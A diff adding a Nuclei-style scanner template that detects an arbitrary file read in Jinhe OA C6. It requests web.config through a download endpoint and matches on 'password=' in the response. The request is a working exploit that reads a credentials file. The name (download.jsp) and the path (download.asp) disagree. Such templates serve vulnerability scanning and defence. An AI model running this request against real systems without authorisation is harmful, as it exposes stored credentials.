@@ -1,0 +1,22 @@
+id: jinhe-oa-c6-lfi
+
+info:
+  name: Jinhe OA C6 download.jsp - Arbitary File Read
+  author: HuanXiong
+  severity: high
+
+  tags: File Reading
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config'
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body,"<configuration>") && contains(body,"password=")'
+          - 'contains(header,"filename=") && contains(header,"application/octet-stream")'
+        condition: and
+
